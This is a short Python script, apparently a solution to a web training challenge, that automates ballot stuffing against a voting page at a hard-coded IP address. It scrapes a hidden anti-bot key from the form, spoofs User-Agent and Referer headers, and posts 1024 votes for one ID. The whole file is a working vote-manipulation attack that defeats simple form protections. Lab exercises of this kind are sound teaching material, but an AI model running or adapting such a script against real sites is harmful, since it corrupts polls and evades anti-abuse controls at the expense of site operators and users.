#!/usr/bin/python3

import requests
from bs4 import BeautifulSoup

data_info = {"id": "3867", "holdthedoor": "submit", "key":""}
fake_header = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
               "referer": "http://158.69.76.135/level2.php"}

for i in range(1024):
    hodor_session = requests.session()
    HTML_page = hodor_session.get("http://158.69.76.135/level2.php")
    HTML_parse = BeautifulSoup(HTML_page.text, "html.parser")
    hidden_value = HTML_parse.find("form", {"method": "post"})
    hidden_value = hidden_value.find("input", {"type": "hidden"})
    data_info["key"] = hidden_value["value"]
    hodor_session.post("http://158.69.76.135/level2.php", data=data_info, headers=fake_header)
    print(f"vote #{i}")
